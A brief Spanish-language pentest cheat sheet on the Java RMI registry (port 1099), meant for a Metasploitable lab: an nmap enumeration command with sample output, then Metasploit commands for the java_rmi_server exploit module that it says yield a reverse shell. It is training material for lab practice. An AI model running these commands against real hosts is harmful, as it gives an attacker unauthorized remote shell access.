# EXPLOITING JAVA RMI REGISTRY

(se puede probar en metasploitable)

**puerto por defecto 1099**

**enumeracion**

```bash
nmap -sT 10.10.10.10 -p1099 -sV 

#output
1099/tcp open rmiregistry syn-ack
1099/tcp open java-rmi Java RMI
```

**explotacion METASPLOIT**

```bash
use exploit/multi/misc/java_rmi_server
set rhost 10.10.1.10
set rport 1099
run
```

y nos dara una reverse shell